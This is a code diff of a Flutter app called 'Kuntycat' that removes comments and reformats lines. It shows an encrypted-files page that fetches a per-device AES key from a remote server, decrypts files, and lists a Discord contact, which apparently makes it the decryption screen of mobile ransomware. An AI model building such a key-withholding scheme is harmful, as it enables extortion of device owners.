@@ -31,10 +31,10 @@ Future<String?> _getDeviceId() async {
 
   if (Platform.isAndroid) {
     AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
-    deviceId = androidInfo.id; // Menggunakan 'id' untuk Android
+    deviceId = androidInfo.id;
   } else if (Platform.isIOS) {
     IosDeviceInfo iosInfo = await deviceInfo.iosInfo;
-    deviceId = iosInfo.identifierForVendor; // Unique ID on iOS
+    deviceId = iosInfo.identifierForVendor;
   }
   return deviceId;
 }
@@ -49,8 +49,7 @@ Future<void> _saveDeviceId(String deviceId) async {
 Future<encrypt.Key> _getEncryptionKey() async {
   SharedPreferences prefs = await SharedPreferences.getInstance();
   String? cachedKey = prefs.getString('encryption_key');
-  String? deviceId = await _getDeviceId(); // Ambil device ID
-
+  String? deviceId = await _getDeviceId();
   // Cek jika kunci ada di cache
   if (cachedKey != null && cachedKey.length == 64) {
     print("Menggunakan kunci enkripsi dari cache");
@@ -59,8 +58,7 @@ Future<encrypt.Key> _getEncryptionKey() async {
 
   try {
     final response = await http.get(
-      Uri.parse(
-          'https://example.com/get-encryption-key/$deviceId'), // Menggunakan HTTPS
+      Uri.parse('https://example.com/get-encryption-key/$deviceId'),
     );
 
     if (response.statusCode == 200) {
@@ -141,10 +139,8 @@ Future<void> _decryptFileWithKey(File file, String keyString) async {
     List<int> encryptedBytes = await file.readAsBytes();
     final key = _convertKeyFromString(keyString);
 
-    final ivBytes =
-        Uint8List.fromList(encryptedBytes.sublist(0, 16)); // Mengambil IV
-    final encryptedData = Uint8List.fromList(
-        encryptedBytes.sublist(16)); // Mengambil data terenkripsi
+    final ivBytes = Uint8List.fromList(encryptedBytes.sublist(0, 16));
+    final encryptedData = Uint8List.fromList(encryptedBytes.sublist(16));
     final iv = encrypt.IV(ivBytes);
     final encrypter =
         encrypt.Encrypter(encrypt.AES(key, mode: encrypt.AESMode.cbc));
@@ -198,7 +194,7 @@ class _EncryptedFilesPageState extends State<EncryptedFilesPage> {
   @override
   void initState() {
     super.initState();
-    _initDeviceId(); // Inisialisasi device ID saat halaman dibuat
+    _initDeviceId();
   }
 
   // Fungsi untuk inisialisasi device ID
@@ -228,8 +224,7 @@ class _EncryptedFilesPageState extends State<EncryptedFilesPage> {
             return SingleChildScrollView(
               child: Center(
                 child: Padding(
-                  padding: EdgeInsets.all(
-                      screenWidth * 0.04), // Sedikit diperkecil padding
+                  padding: EdgeInsets.all(screenWidth * 0.04),
                   child: Column(
                     mainAxisAlignment: MainAxisAlignment.center,
                     crossAxisAlignment: CrossAxisAlignment.center,
@@ -238,8 +233,7 @@ class _EncryptedFilesPageState extends State<EncryptedFilesPage> {
                         'Kuntycat',
                         style: TextStyle(
                           color: Colors.white,
-                          fontSize:
-                              screenWidth * 0.055, // Diperkecil ukuran teks
+                          fontSize: screenWidth * 0.055,
                           fontWeight: FontWeight.bold,
                         ),
                         textAlign: TextAlign.center,
@@ -247,38 +241,32 @@ class _EncryptedFilesPageState extends State<EncryptedFilesPage> {
                       SizedBox(height: screenHeight * 0.015),
                       Image.asset(
                         'assets/images/iconvpx.png',
-                        height: screenHeight *
-                            0.20, // Sedikit diperkecil tinggi gambar
+                        height: screenHeight * 0.20,
                       ),
                       Row(
                         mainAxisAlignment: MainAxisAlignment.center,
                         children: [
                           // Ikon Discord
                           FaIcon(
-                            FontAwesomeIcons
-                                .discord, // Menggunakan ikon Discord
+                            FontAwesomeIcons.discord,
                             color: Colors.white,
-                            size:
-                                20, // Ukuran ikon (sesuaikan sesuai kebutuhan)
+                            size: 20,
                           ),
-                          SizedBox(width: 5), // Jarak antara ikon dan teks
-                          // Teks untuk Discord
+                          SizedBox(width: 5),
                           Text(
                             "Discord: kunttycat ",
                             style: GoogleFonts.inika(
                               color: Colors.white,
                               fontSize: 15,
                             ),
-                            textAlign: TextAlign
-                                .center, // Mengatur teks agar justify center
+                            textAlign: TextAlign.center,
                           ),
                         ],
                       ),
                       SizedBox(height: screenHeight * 0.025),
                       Container(
-                        constraints: BoxConstraints(
-                            maxHeight: screenHeight *
-                                0.35), // Batasi tinggi card lebih kecil
+                        constraints:
+                            BoxConstraints(maxHeight: screenHeight * 0.35),
                         child: Card(
                           color: Colors.white,
                           shape: RoundedRectangleBorder(
@@ -286,8 +274,7 @@ class _EncryptedFilesPageState extends State<EncryptedFilesPage> {
                           ),
                           elevation: 8,
                           child: Padding(
-                            padding: EdgeInsets.all(screenWidth *
-                                0.035), // Sedikit diperkecil padding dalam card
+                            padding: EdgeInsets.all(screenWidth * 0.035),
                             child: Column(
                               crossAxisAlignment: CrossAxisAlignment.start,
                               children: [
@@ -387,25 +374,20 @@ class _EncryptedFilesPageState extends State<EncryptedFilesPage> {
                             borderRadius: BorderRadius.circular(10),
                           ),
                           padding: EdgeInsets.symmetric(
-                            horizontal: screenWidth *
-                                0.18, // Diperkecil horizontal padding
-                            vertical: screenHeight *
-                                0.015, // Diperkecil vertical padding
+                            horizontal: screenWidth * 0.18,
+                            vertical: screenHeight * 0.015,
                           ),
                         ),
                         child: Text(
                           'DECRYPT',
-                          style: TextStyle(
-                              fontSize: screenWidth *
-                                  0.04), // Ukuran teks tombol sedikit lebih kecil
+                          style: TextStyle(fontSize: screenWidth * 0.04),
                         ),
                       ),
                       SizedBox(height: screenHeight * 0.02),
                       Text(
                         "Version 1.0",
                         style: TextStyle(
-                          fontSize:
-                              screenWidth * 0.035, // Ukuran teks diperkecil
+                          fontSize: screenWidth * 0.035,
                           fontWeight: FontWeight.bold,
                           color: Colors.white,
                         ),
